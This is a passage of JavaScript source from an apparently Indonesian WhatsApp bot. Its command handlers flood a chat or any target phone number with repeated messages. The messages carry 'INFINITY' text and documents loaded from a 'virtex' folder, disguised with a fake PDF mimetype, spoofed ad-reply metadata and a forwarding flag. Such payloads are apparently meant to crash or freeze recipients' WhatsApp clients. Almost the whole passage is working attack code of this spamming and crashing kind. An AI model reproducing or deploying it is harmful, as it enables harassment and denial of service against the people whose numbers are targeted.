            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            buttonjo(`© YAN BOTZ-MD`)
            break
            case 'joinfiniteto':               
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await repjo(`Berhasil Mengirim Infinite Di Nomer ${text}`)
            break
 case 'jogasinfinite':  
 if (!isCreator && !isBan) return
 if (!text) throw `Nomernya mana?`
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(m.chat, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:`INFINITY\n${thejo}`},{quoted:fgamjo})
            buttonjo(`Berhasil Mengirim Infinite Di Nomer ${text}`)
            break
          case 'jomomo': {            
          if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
            await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            }
            buttonjo(`Sukses Send Momo Sebanyak ${jumlah}`)
            }
            break
          case 'jomomoto': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await repjo(`Berhasil Mengirim Momo Di Nomer ${text}`)
            }
            break
          case 'jogasmomo': {            
          if (!isCreator && !isBan) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
            await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
            buttonjo(`Berhasil Mengirim Momo Di Nomer ${text}`)
            }
            break

case 'malam':
case 'mlm':
case 'sore':
case 'siang':
case 'pagi': {            
          if (!isCreator && !isBan) return
             salem = `السلام عليكم
`
await jobotz.sendMessage(m.chat, {text:salem},{quoted:fgamjo})
buttonjo(`Assalamualaikum`)
}
break
case 'johello': {            
          if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
}
buttonjo(`Sukses Send Hello Sebanyak ${jumlah}`)
}
            break
case 'johelloto': {            
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await repjo(`Berhasil Mengirim Hello Di Nomer ${text}`)
}
            break
case 'jogashello': {            
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
